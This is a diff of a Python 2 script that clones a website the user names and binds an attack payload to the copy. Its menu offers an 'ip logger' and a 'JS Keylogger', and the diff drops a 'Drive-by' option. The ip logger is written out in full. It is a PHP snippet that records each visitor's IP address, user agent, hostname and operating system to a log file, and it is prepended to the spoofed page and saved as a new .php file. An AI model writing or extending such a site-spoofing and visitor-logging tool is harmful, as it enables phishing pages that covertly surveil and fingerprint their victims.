@@ -21,21 +21,22 @@ checkIfExist = os.path.isfile(fileName)
 if checkIfExist == 0:
     open(fileName, "w")
 
-#Delete spoofed.html if exist
+#Delete spoofed.html if exist (has old data as backup)
 if checkIfExist == 1:
     os.remove(fileName)
     
-print 'Enter website url to spoof e.g (http://google.com)'
+print 'Enter website url to spoof e.g (http://google.com)\n'
 
 url = raw_input()
+print "\n"
 
 # Download the website files
+os.system("cls") 
 print 'Spoofing '+ url + ', this may take a few'
 urllib.urlretrieve (url, fileName)
 
 # Tell the user we finished
-print 'Download completed'
-os.system("cls")
+print 'Download completed\n\n'
 
 # Store downloaded website content in spoofed.html
 fileOpen = open(fileName, 'r')
@@ -45,22 +46,21 @@ fileOpen.close()
 # Choose what payloads to add to new webpage
 print 'Enter corresponding key to add payload:'
 print '[1] Add ip logger'
-print '[2] Add JS Keylogger'
-print '[3] Add Drive-by'
+print '[2] Add JS Keylogger (EXPERMIENTAL)'
 payload = raw_input()
 
 # Ip logger payload
 if payload == '1':
     ipLogger = '<?php\n$file="iplog.txt";\n$f=fopen($file,"a");\nfwrite($f,"-------------------------"."\n");\nfwrite($f,"IP Address:".$_SERVER["REMOTE_ADDR"]."\n");\nfwrite($f,"User Agemt:".$_SERVER["HTTP_USER_AGENT"]."\n");\nfwrite($f,"Host Name:".php_uname("n")."\n");\nfwrite($f,"Operating System:".php_uname("v")."(".php_uname("s").")"."\n");\nfclose($f);\n?>'
-    print 'Create new name for file: eg. (google)'
+    print '\nCreate new name for file: eg. (google)\n'
     newFileName = raw_input() + '.php'
-    print 'Binding an ip logger to ' + newFileName
+    print '\nBinding an ip logger to ' + newFileName
     
     makePage = open (newFileName, 'a') ## a will append, w will over-write
     makePage.write(ipLogger)           ## 
     makePage.write(fileContent)
     makePage.close()
-    print 'Bound payload(s) successfully! Exiting in 4 seconds...'
+    print '\nBound payload(s) successfully! Exiting in 4 seconds...'
     os.remove(fileName)
     time.sleep(4)
 
